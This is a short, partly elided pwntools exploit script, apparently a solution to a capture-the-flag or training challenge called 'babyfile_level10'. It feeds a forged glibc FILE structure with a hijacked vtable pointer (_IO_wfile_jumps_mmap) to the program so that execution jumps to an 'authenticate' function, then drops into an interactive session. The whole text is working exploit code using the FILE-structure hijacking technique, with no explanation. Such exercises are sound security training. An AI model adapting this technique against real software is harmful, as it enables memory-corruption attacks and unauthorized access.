...
context.binary=e=ELF("./babyfile_level10")
libc=e.libc
gs="""
set listsize 50
...
if args.LOCAL:
    ...
    p=s.process("/challenge/babyfile_level10")
...
p.sendafter(b"Now reading from stdin directly to the FILE struct.",
               b"password"+
               b"\0"*(130-len(b"password"))+b"\x00"+
               b"\0"*(136-131)+p64(e.sym.buf+56+8)+
               b"\0"*(160-136-8)+p64(fp+216+8-224)+
               b"\0"*(192-168)+p32(0)+
               b"\0"*(216-192-4)+
               p64(libc.sym._IO_wfile_jumps_mmap)+
               p64(fp+216+8+8)+
               b"\0"*(104)+p64(e.sym.authenticate)
)
p.interactive()